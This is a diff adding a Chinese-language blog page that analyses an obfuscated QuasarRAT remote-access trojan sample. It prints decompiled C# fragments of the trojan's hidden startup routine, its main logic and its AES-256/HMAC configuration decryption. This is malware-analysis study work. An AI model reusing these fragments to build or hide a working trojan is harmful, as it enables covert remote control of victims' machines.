@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"woshinext.top","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="来看这个木马比上个稍微难一点  可以看见这个代码中有大量的混淆先找到程序入口  可以看到有混淆的存在来分析是非常困难的于是我就去搜索有没有相关工具可以去混淆 de4dot就是一个去混淆的好工具  可以看见它生成了个clean文件 再打开看看  可以看见混淆清理的非常干净  查看函数GForm0()  1234567protected override void OnLoad(EventArgs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QuasarRAT-2">
+<meta property="og:url" content="https://woshinext.top/2026/04/23/QuasarRAT-2/index.html">
+<meta property="og:site_name" content="woshinext.top">
+<meta property="og:description" content="来看这个木马比上个稍微难一点  可以看见这个代码中有大量的混淆先找到程序入口  可以看到有混淆的存在来分析是非常困难的于是我就去搜索有没有相关工具可以去混淆 de4dot就是一个去混淆的好工具  可以看见它生成了个clean文件 再打开看看  可以看见混淆清理的非常干净  查看函数GForm0()  1234567protected override void OnLoad(EventArgs">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423155713827.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423160012069.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423160442461.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423161244716.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423161437355.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423161635809.png">
+<meta property="article:published_time" content="2026-04-23T07:56:15.000Z">
+<meta property="article:modified_time" content="2026-04-23T08:32:23.665Z">
+<meta property="article:author" content="Next">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423155713827.png">
+
+
+<link rel="canonical" href="https://woshinext.top/2026/04/23/QuasarRAT-2/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://woshinext.top/2026/04/23/QuasarRAT-2/","path":"2026/04/23/QuasarRAT-2/","title":"QuasarRAT-2"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>QuasarRAT-2 | woshinext.top</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">woshinext.top</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-逆向基础"><a href="/categories/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/" rel="section"><i class="fa fa-book fa-fw"></i>逆向基础</a></li><li class="menu-item menu-item-自动化逆向"><a href="/categories/%E8%87%AA%E5%8A%A8%E5%8C%96%E9%80%86%E5%90%91/" rel="section"><i class="fa fa-code fa-fw"></i>自动化逆向</a></li><li class="menu-item menu-item-进阶攻防"><a href="/categories/%E8%BF%9B%E9%98%B6%E6%94%BB%E9%98%B2/" rel="section"><i class="fa fa-shield-alt fa-fw"></i>进阶攻防</a></li><li class="menu-item menu-item-question"><a href="/categories/question/" rel="section"><i class="fa fa-question fa-fw"></i>question</a></li><li class="menu-item menu-item-样本分析"><a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" rel="section"><i class="fa fa fa-list-alt fa-fw"></i>样本分析</a></li><li class="menu-item menu-item-内核驱动"><a href="/categories/%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8/" rel="section"><i class="fa fa-server fa-fw"></i>内核驱动</a></li><li class="menu-item menu-item-归档"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-关于"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Next</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://woshinext.top/2026/04/23/QuasarRAT-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Next">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="woshinext.top">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="QuasarRAT-2 | woshinext.top">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          QuasarRAT-2
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-04-23 15:56:15 / Modified: 16:32:23" itemprop="dateCreated datePublished" datetime="2026-04-23T15:56:15+08:00">2026-04-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">样本分析</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423155713827.png" alt="image-20260423155713827"></p>
+<p>来看这个木马比上个稍微难一点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423160012069.png" alt="image-20260423160012069"></p>
+<p>可以看见这个代码中有大量的混淆先找到程序入口</p>
+<p><img src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423160442461.png" alt="image-20260423160442461"></p>
+<p>可以看到有混淆的存在来分析是非常困难的于是我就去搜索有没有相关工具可以去混淆</p>
+<p>de4dot就是一个去混淆的好工具</p>
+<p><img src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423161244716.png" alt="image-20260423161244716"></p>
+<p>可以看见它生成了个clean文件</p>
+<p>再打开看看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423161437355.png" alt="image-20260423161437355"></p>
+<p>可以看见混淆清理的非常干净</p>
+<p> 查看函数GForm0()</p>
+<p><img src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423161635809.png" alt="image-20260423161635809"></p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">OnLoad</span>(<span class="params">EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">base</span>.Visible = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">base</span>.ShowInTaskbar = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">this</span>.method_1();</span><br><span class="line">	<span class="keyword">base</span>.OnLoad(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中method_1()是木马的主要逻辑</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method_1</span>()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!GClass65.smethod_0())</span><br><span class="line">		&#123;</span><br><span class="line">			Environment.Exit(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">this</span>.gclass1_0 = <span class="keyword">new</span> GClass1(GClass65.string_5);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">this</span>.gclass1_0.CreatedNew)</span><br><span class="line">		&#123;</span><br><span class="line">			Environment.Exit(<span class="number">2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		Class19.smethod_4(Application.ExecutablePath);</span><br><span class="line">		GClass5 gclass = <span class="keyword">new</span> GClass5();</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.IsInstallationRequired)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>.gclass1_0.Dispose();</span><br><span class="line">			<span class="keyword">try</span></span><br><span class="line">			&#123;</span><br><span class="line">				gclass.method_1();</span><br><span class="line">				Environment.Exit(<span class="number">3</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (Exception)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">try</span></span><br><span class="line">		&#123;</span><br><span class="line">			gclass.method_0();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Exception)</span><br><span class="line">		&#123;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!GClass65.bool_6)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>.method_0();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (GClass65.bool_3)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>.gclass46_0 = <span class="keyword">new</span> GClass46();</span><br><span class="line">			<span class="keyword">this</span>.gclass46_0.method_0();</span><br><span class="line">		&#125;</span><br><span class="line">		Class27 @class = <span class="keyword">new</span> Class27(<span class="keyword">new</span> Class26().method_0(GClass65.string_1));</span><br><span class="line">		<span class="keyword">this</span>.gclass31_0 = <span class="keyword">new</span> GClass31(@class, GClass65.x509Certificate2_0);</span><br><span class="line">		<span class="keyword">this</span>.gclass31_0.Event_1 += <span class="keyword">this</span>.gclass31_0_ClientState;</span><br><span class="line">		<span class="keyword">this</span>.method_2(<span class="keyword">this</span>.gclass31_0);</span><br><span class="line">		<span class="keyword">this</span>.gclass2_0 = <span class="keyword">new</span> GClass2(<span class="keyword">this</span>.gclass31_0);</span><br><span class="line">		<span class="keyword">this</span>.gclass2_0.method_1();</span><br><span class="line">		<span class="keyword">new</span> Thread(<span class="built_in">delegate</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>.gclass31_0.method_15();</span><br><span class="line">			Environment.Exit(<span class="number">0</span>);</span><br><span class="line">		&#125;).Start();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>GClass65是这个木马的初始化</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">GClass65</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Token: 0x06000295 RID: 661 RVA: 0x00058284 File Offset: 0x00056484</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">smethod_0</span>()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(GClass65.string_0))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		Class28 @class = <span class="keyword">new</span> Class28(GClass65.string_7);</span><br><span class="line">		GClass65.string_8 = @class.method_2(GClass65.string_8);</span><br><span class="line">		GClass65.string_0 = @class.method_2(GClass65.string_0);</span><br><span class="line">		GClass65.string_1 = @class.method_2(GClass65.string_1);</span><br><span class="line">		GClass65.string_3 = @class.method_2(GClass65.string_3);</span><br><span class="line">		GClass65.string_4 = @class.method_2(GClass65.string_4);</span><br><span class="line">		GClass65.string_5 = @class.method_2(GClass65.string_5);</span><br><span class="line">		GClass65.string_6 = @class.method_2(GClass65.string_6);</span><br><span class="line">		GClass65.string_9 = @class.method_2(GClass65.string_9);</span><br><span class="line">		GClass65.string_10 = @class.method_2(GClass65.string_10);</span><br><span class="line">		GClass65.x509Certificate2_0 = <span class="keyword">new</span> X509Certificate2(Convert.FromBase64String(@class.method_2(GClass65.string_11)));</span><br><span class="line">		GClass65.smethod_1();</span><br><span class="line">		<span class="keyword">return</span> GClass65.smethod_2();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到哪些关键数据是被method_2处理后在赋值</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">method_2</span>(<span class="params"><span class="built_in">string</span> input</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> Encoding.UTF8.GetString(<span class="keyword">this</span>.method_3(Convert.FromBase64String(input)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到它先base64解码后再传给method_3</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">byte</span>[] <span class="title">method_3</span>(<span class="params"><span class="built_in">byte</span>[] input</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (input == <span class="literal">null</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="string">&quot;input can not be null.&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">byte</span>[] array6;</span><br><span class="line">	<span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream(input))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">using</span> (AesCryptoServiceProvider aesCryptoServiceProvider = <span class="keyword">new</span> AesCryptoServiceProvider())</span><br><span class="line">		&#123;</span><br><span class="line">			aesCryptoServiceProvider.KeySize = <span class="number">256</span>;</span><br><span class="line">			aesCryptoServiceProvider.BlockSize = <span class="number">128</span>;</span><br><span class="line">			aesCryptoServiceProvider.Mode = CipherMode.CBC;</span><br><span class="line">			aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;</span><br><span class="line">			aesCryptoServiceProvider.Key = <span class="keyword">this</span>.byte_0;</span><br><span class="line">			<span class="keyword">using</span> (HMACSHA256 hmacsha = <span class="keyword">new</span> HMACSHA256(<span class="keyword">this</span>.byte_1))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">byte</span>[] array = hmacsha.ComputeHash(memoryStream.ToArray(), <span class="number">32</span>, memoryStream.ToArray().Length - <span class="number">32</span>);</span><br><span class="line">				<span class="built_in">byte</span>[] array2 = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">32</span>];</span><br><span class="line">				memoryStream.Read(array2, <span class="number">0</span>, array2.Length);</span><br><span class="line">				<span class="keyword">if</span> (!Class29.smethod_0(array, array2))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> CryptographicException(<span class="string">&quot;Invalid message authentication code (MAC).&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">byte</span>[] array3 = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">16</span>];</span><br><span class="line">			memoryStream.Read(array3, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">			aesCryptoServiceProvider.IV = array3;</span><br><span class="line">			<span class="keyword">using</span> (CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, aesCryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Read))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">byte</span>[] array4 = <span class="keyword">new</span> <span class="built_in">byte</span>[memoryStream.Length - <span class="number">16L</span> + <span class="number">1L</span>];</span><br><span class="line">				<span class="built_in">byte</span>[] array5 = <span class="keyword">new</span> <span class="built_in">byte</span>[cryptoStream.Read(array4, <span class="number">0</span>, array4.Length)];</span><br><span class="line">				Buffer.BlockCopy(array4, <span class="number">0</span>, array5, <span class="number">0</span>, array5.Length);</span><br><span class="line">				array6 = array5;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> array6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看见先是给256aes加密设置了一下然后验证了hash值</p>
+<pre><code>				if (!Class29.smethod_0(array, array2))
+				{
+					throw new CryptographicException(&quot;Invalid message authentication code (MAC).&quot;);
+				}
+</code></pre>
+<p>这个对比了hash值来确保木马没有被篡改，最后再aes256解密</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/04/21/RatonRAT/" rel="prev" title="RatonRAT">
+                  <i class="fa fa-angle-left"></i> RatonRAT
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Next</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
